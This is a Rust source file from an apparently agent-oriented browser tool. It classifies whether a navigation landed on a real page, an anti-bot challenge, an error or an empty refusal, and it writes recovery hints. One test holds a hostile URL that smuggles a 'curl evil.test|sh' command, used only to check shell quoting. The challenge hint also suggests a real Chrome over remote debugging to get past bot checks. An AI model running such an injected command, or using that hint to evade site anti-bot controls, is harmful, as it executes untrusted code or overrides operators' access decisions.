//! What answered, as opposed to where the navigation landed.
//!
//! One token, `serving`, from a closed set of five, on every `landed`. Decided from two
//! measurements only: the HTTP status the browser reported, and a [`PageShape`] read from the
//! settled document. Every condition is a conjunction.
//!
//! | word | when |
//! |---|---|
//! | `challenge` | a frame or script from a known anti-bot vendor, no form control, under [`TEXT_FLOOR`] characters |
//! | `error` | the status is 4xx or 5xx |
//! | `nothing_actionable` | no control, no link, no script, under [`TEXT_FLOOR`] characters |
//! | `unreadable` | the shape probe did not run |
//! | `page` | none of the above |
//!
//! Ranked in that order. `challenge` outranks `error` because a vendor host names the mechanism
//! and the recovery while a 403 reads as an authorization problem, and both facts stay on the
//! response. `error` outranks `nothing_actionable` because a status is the server's own
//! statement and a shape is only our inference about one.
//!
//! `page` is the absence of contradicting evidence, not a certificate: a paywall, a cookie wall,
//! a vendor not in [`CHALLENGE_ORIGINS`] and a page that rendered late all read `page`. The rule
//! leans that way on purpose, since declaring a usable page blocked makes an agent abandon work
//! it could have done. `nothing_actionable` likewise measures the document rather than claiming
//! a block: a first paint that is empty and an edge refusal are identical from here.
//!
//! Not detected: a refusal with enough prose to clear [`TEXT_FLOOR`], a real link, or a script
//! of its own; a vendor that inlines its challenge; a vendor resource past the probe's caps (20
//! frames, 60 scripts); a soft 404; a consent wall; anything inside an iframe.

use serde::Serialize;

/// How much text a document may hold and still be called "nothing to act on".
///
/// 512 characters is roughly eighty words: below anything written to be read, above every
/// refusal notice measured here (an F5 notice holds ~150). Text is over-counted — hidden and
/// collapsed text included — which biases the answer towards `page`.
pub const TEXT_FLOOR: u32 = 512;

/// Resource origins that belong to an anti-bot challenge, matched on the vendor's host and,
/// where the host is shared, a path prefix.
///
/// A hostname is the evidence, not a keyword: vendor-chosen, identical everywhere it deploys,
/// language-independent, and not written by whoever describes their own block page. Scripts as
/// well as frames, because vendors use one each. A wrong entry can fire only on a document that
/// would have read `nothing_actionable` anyway.
const CHALLENGE_ORIGINS: &[(&str, &str)] = &[
    ("challenges.cloudflare.com", "/"), // Cloudflare Turnstile and managed challenge
    ("geo.captcha-delivery.com", "/"),  // DataDome device check
    ("hcaptcha.com", "/"),              // hCaptcha, incl. newassets.hcaptcha.com
    ("arkoselabs.com", "/"),            // Arkose Labs / FunCaptcha
    // Google's host serves everything, so here the path is what identifies the widget.
    ("www.google.com", "/recaptcha/"),
    ("www.recaptcha.net", "/recaptcha/"),
];

/// What was served, in one word.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Serving {
    /// Nothing measured contradicts the page having been served. Not a certificate.
    Page,
    /// A known anti-bot vendor's frame or script is in the document and there is nothing else
    /// in it to act on.
    Challenge,
    /// The server answered with a 4xx or 5xx status.
    Error,
    /// The document offers nothing to act on and holds almost no text. A measurement, not a
    /// claim that the caller was blocked.
    NothingActionable,
    /// The shape probe did not run, so nothing is known beyond the URL and the status.
    Unreadable,
}

impl Serving {
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Page => "page",
            Self::Challenge => "challenge",
            Self::Error => "error",
            Self::NothingActionable => "nothing_actionable",
            Self::Unreadable => "unreadable",
        }
    }
}

/// The settled document, filled by `commands::goto` from one `Runtime.evaluate`, so every
/// decision below is testable without Chrome. Controls and links are counted separately, never
/// as one total: a block page carries links of the vendor's own, a usable page has controls.
#[derive(Debug, Clone, Default)]
pub struct PageShape {
    /// The `src` of every frame and external script in the top document, query stripped, capped.
    /// Both element kinds, because vendors use one each — see [`CHALLENGE_ORIGINS`].
    pub resource_urls: Vec<String>,
    /// Form controls outside any frame: `input` (not hidden), `textarea`, `select`, `button`,
    /// `[role=button]`, `[contenteditable]`.
    pub controls: u32,
    /// Links outside any frame whose href resolves to http(s). A `javascript:` link is not a
    /// destination and is not counted.
    pub links: u32,
    /// `<script src>` elements. Zero is the signal: an edge appliance generates its refusal
    /// without reaching the origin's asset pipeline, so those pages are self-contained.
    pub scripts: u32,
    /// Characters outside `<script>`/`<style>`/`<noscript>`/`<template>`, counted up to a cap.
    pub text_length: u32,
}

impl PageShape {
    /// Read the shape out of the probe's JSON. `None`, never a default: a zero-valued shape
    /// would read as "an empty document", the strongest claim this module makes.
    #[must_use]
    pub fn from_probe(value: Option<&serde_json::Value>) -> Option<Self> {
        let object = value?.as_object()?;
        let resource_urls = object
            .get("resources")
            .and_then(serde_json::Value::as_array)
            .map(|items| {
                items
                    .iter()
                    .filter_map(serde_json::Value::as_str)
                    .map(String::from)
                    .collect()
            })
            .unwrap_or_default();
        let number = |key: &str| -> Option<u32> {
            object
                .get(key)
                .and_then(serde_json::Value::as_u64)
                .and_then(|n| u32::try_from(n).ok())
        };
        Some(Self {
            resource_urls,
            controls: number("controls")?,
            links: number("links")?,
            scripts: number("scripts")?,
            text_length: number("text")?,
        })
    }
}

/// The host of a challenge vendor's frame or script in this document, if there is one, spelled
/// as the page spells it — so the response names the evidence rather than the conclusion.
#[must_use]
pub fn challenge_origin(shape: &PageShape) -> Option<String> {
    shape.resource_urls.iter().find_map(|src| {
        let (host, path) = crate::landing::host_and_path(src)?;
        CHALLENGE_ORIGINS
            .iter()
            .any(|(vendor, prefix)| host_matches(host, vendor) && path.starts_with(prefix))
            .then(|| host.to_string())
    })
}

/// Whether `host` is the vendor's host or a subdomain of it. A suffix test, not a substring one:
/// `newassets.hcaptcha.com` is hCaptcha, `nothcaptcha.com` is somebody else.
fn host_matches(host: &str, vendor: &str) -> bool {
    host == vendor
        || host
            .strip_suffix(vendor)
            .is_some_and(|head| head.ends_with('.'))
}

/// What was served, and the evidence for it.
#[derive(Debug, Clone, Serialize)]
pub struct Assessment {
    pub serving: Serving,
    /// The host of a challenge frame found in the document, whatever the verdict — including
    /// under `page`, where a widget on a working form is a fact worth having when the submit
    /// later fails. `serving` is the branch; this is the evidence.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub challenge_from: Option<String>,
    /// Behind `nothing_actionable`, for the hint. Not serialised: a field that means something
    /// under only one of five words is a rule every reader has to learn.
    #[serde(skip)]
    text_length: u32,
}

/// Decide what was served from the status and the document's shape.
///
/// Pure. The ladder and the reasons for its order are in the module docs.
#[must_use]
pub fn assess(http_status: Option<u16>, shape: Option<&PageShape>) -> Assessment {
    let challenge_from = shape.and_then(challenge_origin);
    let is_error = http_status.is_some_and(|code| (400..=599).contains(&code));
    let serving = match shape {
        // The probe did not run; a 4xx is still the server's statement and outranks our
        // ignorance of the document.
        None if is_error => Serving::Error,
        None => Serving::Unreadable,
        // A vendor's own code, and no form of the site's own for it to be protecting.
        Some(shape)
            if challenge_from.is_some()
                && shape.controls == 0
                && shape.text_length < TEXT_FLOOR =>
        {
            Serving::Challenge
        }
        Some(_) if is_error => Serving::Error,
        // Nothing to act on, almost no text, and nothing loaded from elsewhere. That last
        // condition separates a self-contained refusal notice from an unhydrated page shell,
        // which ships its scripts from the first byte.
        Some(shape)
            if shape.controls == 0
                && shape.links == 0
                && shape.scripts == 0
                && shape.text_length < TEXT_FLOOR =>
        {
            Serving::NothingActionable
        }
        Some(_) => Serving::Page,
    };
    Assessment {
        serving,
        challenge_from,
        text_length: shape.map_or(0, |shape| shape.text_length),
    }
}

impl Assessment {
    /// The one-line gloss text mode prints beside the word, or nothing when the page answered
    /// normally. It states the measurement, never the conclusion.
    #[must_use]
    pub fn gloss(&self) -> Option<String> {
        match self.serving {
            Serving::Page => None,
            Serving::Challenge => Some(format!(
                "a challenge frame from {} is the only thing here to act on",
                self.challenge_from
                    .as_deref()
                    .unwrap_or("an anti-bot vendor")
            )),
            Serving::Error => Some("the server answered with an error status".to_string()),
            Serving::NothingActionable => Some(format!(
                "no link, no form control and nothing loaded from elsewhere, and {} characters \
                 of text",
                self.text_length
            )),
            Serving::Unreadable => {
                Some("the probe that reads this document's shape did not run".to_string())
            }
        }
    }

    /// What to do about it, under the three rules in `hints.rs`. Kept under 400 characters so
    /// one wording serves both JSON and a terminal, rather than needing a second table that
    /// could fall out of step.
    #[must_use]
    pub fn hint(&self, http_status: Option<u16>, url: &str, browser: &str) -> Option<String> {
        let run = invocation(browser);
        match self.serving {
            Serving::Page => None,
            Serving::Challenge => Some(format!(
                "A challenge frame from {} is the only thing here to act on, so the page asked \
                 for was not served. --stealth does not defeat these: they fingerprint bundled \
                 Chromium. Run `{run} --connect http://127.0.0.1:9222 goto {}` against a \
                 Chrome started with --remote-debugging-port=9222. Navigating again unchanged \
                 gets the same challenge.",
                self.challenge_from
                    .as_deref()
                    .unwrap_or("an anti-bot vendor"),
                crate::landing::shell_quoted(url)
            )),
            Serving::Error => http_status.map(|code| error_hint(code, url, &run)),
            Serving::NothingActionable => Some(format!(
                "This document has no link, no form control, no script and {} characters of \
                 text — nothing to act on, and nothing loaded from anywhere else. An edge \
                 appliance's refusal notice is self-contained like this; so is a page whose \
                 content had not arrived when the tool looked. It is a measurement, not a \
                 claim you were blocked. Run `{run} inspect` to read it.",
                self.text_length
            )),
            Serving::Unreadable => Some(format!(
                "The probe that reads this document's shape did not run, so nothing is known \
                 about what was served beyond its URL and status. Run `{run} inspect` to read \
                 the page directly."
            )),
        }
    }
}

/// One hint per class of status, because the recoveries differ: a 404 is a fact about the URL,
/// a 403 about who is asking, a 429 about how often, a 5xx about the server. One shared
/// sentence would be rule 1 without rule 2.
fn error_hint(code: u16, url: &str, run: &str) -> String {
    match code {
        401 | 403 => format!(
            "The server answered {code} and served this document instead of the page: it \
             refused the request rather than failing to find it. Run `{run} inspect` to see \
             whether that is a login form to fill in or a block notice with nothing to do on \
             it — the status alone does not distinguish them."
        ),
        404 | 410 => format!(
            "The server answered {code}: this path names nothing it will serve, so the \
             document below is its error page and not the page asked for. The URL is the \
             thing to correct — run `{run} goto {}` to reach the site root and find the real \
             path from there.",
            crate::landing::shell_quoted(
                &crate::landing::origin_of(url).unwrap_or_else(|| url.to_string())
            )
        ),
        429 => format!(
            "The server answered {code}: it is refusing on rate, not on content, so nothing \
             about the page is known. No flag in this tool changes that and navigating again \
             immediately earns another {code}; run `{run} inspect` only to read whatever \
             retry-after wording the document carries."
        ),
        500..=599 => format!(
            "The server answered {code}: the failure is on its side and the document below is \
             its error page. Nothing in this tool changes that. Run `{run} inspect` to read \
             what the server said before deciding whether this URL is worth another attempt \
             later."
        ),
        _ => format!(
            "The server answered {code} and served this document instead of the page asked \
             for. Run `{run} inspect` to read what it sent."
        ),
    }
}

/// The invocation prefix that reaches THIS session's browser. Duplicates `hints::invocation`,
/// which is private to a module about errors while this rides on a successful response.
fn invocation(browser: &str) -> String {
    if browser == "default" {
        "chrome-agent".to_string()
    } else {
        format!("chrome-agent --browser {browser}")
    }
}

#[cfg(test)]
mod tests {
    use super::{PageShape, Serving, TEXT_FLOOR, assess, host_matches};

    /// Every shape below was measured on a real page, so a threshold that moves has to be
    /// argued against a site rather than against a number.
    struct Shape;
    impl Shape {
        /// F5 ASM refusal: HTTP 200, ~150 characters, one uncounted `javascript:` anchor,
        /// nothing loaded from anywhere.
        fn f5_refusal() -> PageShape {
            PageShape {
                resource_urls: vec![],
                controls: 0,
                links: 0,
                scripts: 0,
                text_length: 152,
            }
        }
        /// Turnstile interstitial: the vendor URL on a `<script>`, the `<iframe>` `src` empty.
        fn cloudflare_interstitial() -> PageShape {
            PageShape {
                resource_urls: vec![CLOUDFLARE.into()],
                controls: 0,
                links: 0,
                scripts: 2,
                text_length: 38,
            }
        }
        /// Cloudflare's full block page: two links of its own, no control.
        fn cloudflare_block_page() -> PageShape {
            PageShape {
                resource_urls: vec![CLOUDFLARE.into()],
                controls: 0,
                links: 2,
                scripts: 3,
                text_length: 250,
            }
        }
        /// `DataDome`: the vendor URL on the frame, HTTP 403 beside it.
        fn datadome() -> PageShape {
            PageShape {
                resource_urls: vec![DATADOME.into()],
                controls: 0,
                links: 0,
                scripts: 1,
                text_length: 0,
            }
        }
        /// A login form carrying a Turnstile widget — the expensive false positive.
        fn login_with_turnstile() -> PageShape {
            PageShape {
                resource_urls: vec![CLOUDFLARE.into()],
                controls: 3,
                links: 1,
                scripts: 4,
                text_length: 90,
            }
        }
        /// A page shell before it hydrates: nothing to act on, 21 scripts from the first byte.
        fn unhydrated_shell() -> PageShape {
            PageShape {
                resource_urls: vec![],
                controls: 0,
                links: 0,
                scripts: 21,
                text_length: 40,
            }
        }
        /// An ordinary page.
        fn usable(text_length: u32) -> PageShape {
            PageShape {
                resource_urls: vec![],
                controls: 6,
                links: 40,
                scripts: 8,
                text_length,
            }
        }
    }

    /// Turnstile's real URL, carried on a `<script>`.
    const CLOUDFLARE: &str = "https://challenges.cloudflare.com/turnstile/v0/api.js";
    /// `DataDome`'s real URL, carried on the frame.
    const DATADOME: &str = "https://geo.captcha-delivery.com/captcha/";

    /// A refusal served with a success status.
    #[test]
    fn an_f5_refusal_served_with_200_is_nothing_actionable() {
        let assessment = assess(Some(200), Some(&Shape::f5_refusal()));
        assert_eq!(assessment.serving, Serving::NothingActionable);
        assert!(assessment.challenge_from.is_none());
    }

    /// HTTP 200 with a challenge widget as the whole document.
    #[test]
    fn a_cloudflare_interstitial_is_a_challenge_and_names_its_host() {
        let assessment = assess(Some(200), Some(&Shape::cloudflare_interstitial()));
        assert_eq!(assessment.serving, Serving::Challenge);
        assert_eq!(
            assessment.challenge_from.as_deref(),
            Some("challenges.cloudflare.com")
        );
    }

    /// A block page carries links of the vendor's own, so one combined "actionable" total
    /// would drop it to `error` and send an agent after credentials.
    #[test]
    fn a_block_page_that_links_to_its_own_vendor_is_still_a_challenge() {
        let assessment = assess(Some(403), Some(&Shape::cloudflare_block_page()));
        assert_eq!(
            assessment.serving,
            Serving::Challenge,
            "two vendor links are not a page"
        );
    }

    /// Both facts at once: the frame names the mechanism, the status names a symptom, and the
    /// status stays on the response.
    #[test]
    fn a_challenge_outranks_the_status_it_arrived_with() {
        let assessment = assess(Some(403), Some(&Shape::datadome()));
        assert_eq!(assessment.serving, Serving::Challenge);
        assert_eq!(
            assessment.challenge_from.as_deref(),
            Some("geo.captcha-delivery.com")
        );
    }

    /// A widget on a login form: the page is usable, and the vendor is still reported because
    /// it is true of the document.
    #[test]
    fn a_challenge_widget_beside_a_form_is_not_a_challenge_page() {
        let assessment = assess(Some(200), Some(&Shape::login_with_turnstile()));
        assert_eq!(assessment.serving, Serving::Page);
        assert_eq!(
            assessment.challenge_from.as_deref(),
            Some("challenges.cloudflare.com")
        );
        assert!(
            assessment
                .hint(Some(200), "https://x.com/login", "default")
                .is_none()
        );
    }

    /// A page whose content had not arrived loads scripts from the first byte; an edge refusal
    /// notice does not.
    #[test]
    fn a_page_that_has_not_rendered_yet_is_not_reported_as_empty() {
        assert_eq!(
            assess(Some(200), Some(&Shape::unhydrated_shell())).serving,
            Serving::Page
        );
    }

    /// Prose with nothing to click, on the threshold itself.
    #[test]
    fn prose_with_no_links_is_still_a_page() {
        let mut prose = Shape::f5_refusal();
        prose.text_length = TEXT_FLOOR;
        assert_eq!(assess(Some(200), Some(&prose)).serving, Serving::Page);
        prose.text_length = TEXT_FLOOR - 1;
        assert_eq!(
            assess(Some(200), Some(&prose)).serving,
            Serving::NothingActionable
        );
    }

    /// A 404 with a nav bar and a 404 with nothing on it are both `error`.
    #[test]
    fn a_status_outranks_the_shape_of_the_document_it_came_with() {
        assert_eq!(
            assess(Some(404), Some(&Shape::usable(900))).serving,
            Serving::Error
        );
        assert_eq!(
            assess(Some(404), Some(&Shape::f5_refusal())).serving,
            Serving::Error
        );
        assert_eq!(
            assess(Some(503), Some(&Shape::f5_refusal())).serving,
            Serving::Error
        );
    }

    /// A status this module has no opinion about leaves the shape to answer.
    #[test]
    fn a_2xx_or_3xx_status_decides_nothing_by_itself() {
        assert_eq!(
            assess(Some(204), Some(&Shape::usable(700))).serving,
            Serving::Page
        );
        assert_eq!(
            assess(None, Some(&Shape::usable(700))).serving,
            Serving::Page
        );
    }

    /// An absent shape is an absence, never an empty document — and a 4xx still outranks it.
    #[test]
    fn an_unread_document_is_unreadable_and_never_nothing_actionable() {
        assert_eq!(assess(Some(200), None).serving, Serving::Unreadable);
        assert_eq!(assess(None, None).serving, Serving::Unreadable);
        assert_eq!(assess(Some(403), None).serving, Serving::Error);
        assert!(PageShape::from_probe(None).is_none());
        // Every count is required: a probe that answered half a shape is not a shape.
        assert!(PageShape::from_probe(Some(&serde_json::json!({"resources": []}))).is_none());
        assert!(
            PageShape::from_probe(Some(
                &serde_json::json!({"controls": 0, "links": 0, "text": 3})
            ))
            .is_none(),
            "a missing script count must not default to zero — zero is the whole signal"
        );
        let full = serde_json::json!(
            {"resources": [CLOUDFLARE], "controls": 2, "links": 5, "scripts": 4, "text": 30}
        );
        let parsed = PageShape::from_probe(Some(&full)).expect("a shape");
        assert_eq!(parsed.controls, 2);
        assert_eq!(parsed.links, 5);
        assert_eq!(parsed.scripts, 4);
        assert_eq!(parsed.text_length, 30);
        assert_eq!(parsed.resource_urls.len(), 1);
    }

    /// Matched as a host, not a substring; `www.google.com` counts only on the reCAPTCHA path.
    #[test]
    fn a_vendor_host_is_matched_as_a_host() {
        assert!(host_matches("newassets.hcaptcha.com", "hcaptcha.com"));
        assert!(host_matches("hcaptcha.com", "hcaptcha.com"));
        assert!(!host_matches("nothcaptcha.com", "hcaptcha.com"));
        assert!(!host_matches("hcaptcha.com.evil.test", "hcaptcha.com"));

        // That host serves everything, so only the path tells a captcha from a map.
        let mut interstitial = Shape::cloudflare_interstitial();
        interstitial.resource_urls = vec!["https://www.google.com/recaptcha/api2/anchor".into()];
        assert_eq!(
            assess(Some(200), Some(&interstitial)).serving,
            Serving::Challenge
        );

        let mut map = Shape::f5_refusal();
        map.resource_urls = vec!["https://www.google.com/maps/embed".into()];
        let maps = assess(Some(200), Some(&map));
        assert_eq!(
            maps.serving,
            Serving::NothingActionable,
            "an embedded map is not a challenge"
        );
        assert!(maps.challenge_from.is_none());
    }

    /// Rule 2 of the hint contract: a command reaches this invocation's browser and hands back
    /// no placeholder.
    #[test]
    fn every_hint_names_this_invocation_s_browser_and_no_placeholder() {
        let cases = [
            (Some(200), Shape::cloudflare_interstitial()),
            (Some(403), Shape::usable(200)),
            (Some(404), Shape::usable(900)),
            (Some(429), Shape::usable(900)),
            (Some(418), Shape::usable(900)),
            (Some(503), Shape::usable(10)),
            (Some(200), Shape::f5_refusal()),
        ];
        for (status, page_shape) in cases {
            let assessment = assess(status, Some(&page_shape));
            let hint = assessment
                .hint(status, "https://site.test/a/b", "agent-7")
                .unwrap_or_else(|| panic!("no hint for {status:?}"));
            for word in hint.split('`').skip(1).step_by(2) {
                if let Some(rest) = word.strip_prefix("chrome-agent ") {
                    assert!(
                        rest.starts_with("--browser agent-7 "),
                        "hint runs against the wrong browser: {word}"
                    );
                }
            }
            for placeholder in ["<url>", "<uid>", "<code>", "<host>", "<n>"] {
                assert!(
                    !hint.contains(placeholder),
                    "hint hands back {placeholder}: {hint}"
                );
            }
            for forbidden in ["Try running the command again", "run the command again"] {
                assert!(
                    !hint.contains(forbidden),
                    "hint invites a blind retry: {hint}"
                );
            }
            assert!(hint.ends_with('.'), "hint stops mid-sentence: {hint}");
            // The budget is on the wording, not on the caller's own URL, which goes in whole.
            // Four terminal lines is the ceiling.
            let wording = hint.replace("https://site.test/a/b", "").len();
            assert!(
                wording < 400,
                "hint wording is {wording} characters, too long: {hint}"
            );
        }
        // `unreadable` is reached only through an absent shape.
        let blind = assess(None, None);
        assert!(blind.hint(None, "https://site.test/", "agent-7").is_some());
    }

    /// The URL these hints interpolate is `landed.final` — where the SITE sent the navigation,
    /// not where the caller aimed it. Unquoted, a redirect to a URL carrying `;` or `$(…)`
    /// turned the tool's own suggestion into a different command.
    #[test]
    fn a_url_a_redirect_chose_cannot_break_out_of_a_suggested_command() {
        let hostile = "https://evil.test/a';curl evil.test|sh;echo '";
        let hints = [
            assess(Some(200), Some(&Shape::cloudflare_interstitial()))
                .hint(Some(200), hostile, "default")
                .expect("the challenge hint"),
            assess(Some(404), Some(&Shape::usable(900)))
                .hint(Some(404), hostile, "default")
                .expect("the 404 hint"),
        ];
        for hint in &hints {
            for quoted in hint.split('`').skip(1).step_by(2) {
                let Some((_, argument)) = quoted.split_once("goto ") else {
                    continue;
                };
                assert!(
                    argument.starts_with('\'') && argument.ends_with('\''),
                    "the URL is not one shell word: {argument}"
                );
                assert_eq!(
                    argument.replace(r"'\''", "").matches('\'').count(),
                    2,
                    "an unescaped quote ends the argument early: {argument}"
                );
            }
            assert!(!hint.contains('\n'), "{hint:?}");
        }
    }

    /// One status class, one recovery.
    #[test]
    fn each_status_class_gets_its_own_hint() {
        let hints: Vec<String> = [403, 404, 429, 500]
            .into_iter()
            .map(|code| {
                assess(Some(code), Some(&Shape::usable(300)))
                    .hint(Some(code), "https://site.test/a", "default")
                    .expect("a hint")
            })
            .collect();
        for (i, hint) in hints.iter().enumerate() {
            assert!(
                hint.contains(&[403, 404, 429, 500][i].to_string()),
                "{hint}"
            );
            for (j, other) in hints.iter().enumerate() {
                assert!(
                    i == j || hint != other,
                    "two status classes share a hint: {hint}"
                );
            }
        }
        assert!(
            hints[1].contains("https://site.test/"),
            "the 404 hint names the site root: {}",
            hints[1]
        );
    }

    /// Text mode prints a gloss beside the word, and nothing at all on a page that answered.
    #[test]
    fn the_gloss_states_the_measurement_and_stays_quiet_on_a_page() {
        assert!(
            assess(Some(200), Some(&Shape::usable(900)))
                .gloss()
                .is_none()
        );
        let challenge = assess(Some(200), Some(&Shape::datadome()))
            .gloss()
            .expect("a gloss");
        assert!(
            challenge.contains("geo.captcha-delivery.com"),
            "{challenge}"
        );
        let empty = assess(Some(200), Some(&Shape::f5_refusal()))
            .gloss()
            .expect("a gloss");
        assert!(
            empty.contains("152"),
            "the gloss carries the measurement: {empty}"
        );
    }

    #[test]
    fn the_word_serialises_in_snake_case() {
        let assessment = assess(Some(200), Some(&Shape::f5_refusal()));
        let json = serde_json::to_value(&assessment).expect("serialises");
        assert_eq!(json["serving"], "nothing_actionable");
        assert!(
            json.get("challenge_from").is_none(),
            "absent when nothing was found"
        );
        assert!(
            json.get("text_length").is_none(),
            "evidence for the hint, not a field"
        );
    }
}
